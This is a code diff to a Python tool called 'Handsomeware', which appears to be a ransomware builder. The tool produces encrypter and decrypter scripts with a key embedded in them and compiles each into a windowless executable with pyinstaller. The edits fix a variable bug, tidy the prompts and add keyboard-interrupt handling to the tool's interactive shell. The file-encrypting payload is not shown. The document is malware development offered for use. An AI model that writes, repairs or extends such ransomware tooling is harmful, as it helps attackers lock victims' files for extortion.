@@ -26,7 +26,7 @@ class Handsomeware:
 
     def create_encrypter_file(self,extension=''):
         try:
-            file_name = input("Please enter name for the encrypter file>> ")
+            file_name = input("\nPlease enter name for the encrypter file>> ")
         except KeyboardInterrupt:
             breakpoint
 
@@ -45,17 +45,16 @@ class Handsomeware:
         
     def create_decrypter_file(self):
         try:
-            file_name = input("Please enter name for the decrypter file >> ")
+            file_name = input("\nPlease enter name for the decrypter file>> ")
         except KeyboardInterrupt:
             breakpoint
 
-        if '.py' not in file:
+        if '.py' not in file_name:
             file_name = file_name +".py"
         decrypter = open('decrypter.py','r')
         file = open(file_name,'w')
         for line in decrypter:
             file.write(line.replace('{Key}',f'{self.key()}'))
-            print('d')
         decrypter.close()
         file.close()            
         subprocess.getoutput(f'pyinstaller --onefile --noconsole {file_name}')
@@ -64,7 +63,10 @@ class Handsomeware:
         ascii_generator.generate_ascii()
 
         while commands !='exit':
-            commands = input("Handsomeware>> ")    
+            try:
+                commands = input("Handsomeware>> ")    
+            except KeyboardInterrupt:
+                exit()    
 
             if commands =='help':
                 self.help()
